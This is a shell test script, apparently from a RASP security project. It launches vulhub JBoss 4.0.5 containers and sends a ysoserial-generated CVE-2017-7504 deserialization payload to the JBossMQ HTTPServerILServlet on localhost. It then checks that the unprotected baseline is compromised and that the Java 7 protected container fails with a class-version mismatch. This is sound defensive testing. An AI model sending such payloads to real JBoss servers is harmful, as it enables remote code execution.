...
image="${OHMYRASP_VULHUB_JBOSS_7504_IMAGE:-vulhub/jboss:as-4.0.5}"
baseline_name="${OHMYRASP_VULHUB_JBOSS_7504_BASELINE_NAME:-ohmyrasp-vulhub-jboss7504-baseline}"
protected_name="${OHMYRASP_VULHUB_JBOSS_7504_PROTECTED_NAME:-ohmyrasp-vulhub-jboss7504-protected}"
baseline_port="${OHMYRASP_VULHUB_JBOSS_7504_BASELINE_PORT:-19260}"
protected_port="${OHMYRASP_VULHUB_JBOSS_7504_PROTECTED_PORT:-19261}"
ysoserial_jar="${OHMYRASP_YSOSERIAL_JAR:-/tmp/ohmyrasp-ysoserial/ysoserial.jar}"
success_file="/tmp/ohmyrasp-jboss7504-success"
...
wait_for_http() {
  ...
  echo "${name} did not expose JBossMQ HTTPIL at ${port}" >&2
  exit 1
}
...
generate_payload() {
  ...
  if [[ ! -s "$output" ]]; then
    echo "ysoserial did not generate a JBossMQ CVE-2017-7504 payload" >&2
    exit 1
  fi
}
...
send_payload() {
  ...
  curl -sS -o "$output" -w "%{http_code}" \
    ...
    --data-binary "@${payload}" \
    "http://127.0.0.1:${port}/jbossmq-httpil/HTTPServerILServlet" || true
}
...
status="$(send_payload "$baseline_port" "$payload_file" "${baseline_dir}/httpil.response")"
printf 'httpil_status=%s\n' "$status" >> "${baseline_dir}/attempts.log"
if ! docker exec "$baseline_name" sh -c "test -e '${success_file}'"; then
  sed -n '1,180p' "${baseline_dir}/httpil.response" >&2 || true
  docker logs "$baseline_name" >&2 || true
  echo "baseline JBossMQ CVE-2017-7504 did not create ${success_file}" >&2
  exit 1
fi
printf 'httpil_marker=present\n' >> "${baseline_dir}/attempts.log"
...
if ! grep -q 'Unsupported major.minor version 52.0' "${protected_dir}/container.log"; then
  ...
  echo "JBossMQ Java 7 protected probe did not show Java 8 agent class-version mismatch" >&2
  exit 1
fi
if docker ps --filter "name=${protected_name}" --filter "status=running" --format '{{.Names}}' | grep -q .; then
  echo "JBossMQ Java 7 container unexpectedly kept running with Java 8 agent" >&2
  exit 1
fi

echo "vulhub JBossMQ CVE-2017-7504 Java7 legacy boundary passed"
